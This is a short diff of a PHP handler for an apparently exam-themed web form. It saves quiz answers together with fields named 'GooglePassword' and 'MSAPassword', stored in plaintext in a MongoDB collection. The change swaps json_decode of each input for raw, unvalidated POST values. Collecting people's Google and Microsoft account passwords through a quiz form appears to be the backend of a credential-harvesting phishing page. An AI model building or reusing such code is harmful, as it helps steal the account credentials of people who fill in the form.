@@ -10,14 +10,14 @@
       $collection = $client->Examen2023->Form;
 
       if(isset($_POST['q1'])){
-        $q1 = json_decode($_POST['q1']);
-        $q2 = json_decode($_POST['q2']);
-        $q3 = json_decode($_POST['q3']);
-        $q4 = json_decode($_POST['q4']);
-        $q5 = json_decode($_POST['q5']);
-        $q6 = json_decode($_POST['q6']);
-        $googlePass = json_decode($_POST['gp']);
-        $msaPass = json_decode($_POST['mp']);
+        $q1 = $_POST['q1'];
+        $q2 = $_POST['q2'];
+        $q3 = $_POST['q3'];
+        $q4 = $_POST['q4'];
+        $q5 = $_POST['q5'];
+        $q6 = $_POST['q6'];
+        $googlePass = $_POST['gp'];
+        $msaPass = $_POST['mp'];
 
         $insertOneResult = $collection->insertOne([
             'Q1' => $q1,
@@ -29,7 +29,7 @@
             'GooglePassword' => $googlePass,
             'MSAPassword' => $msaPass,
         ]);
-        echo json_decode(true);
+        echo json_encode(true);
         
       };
       
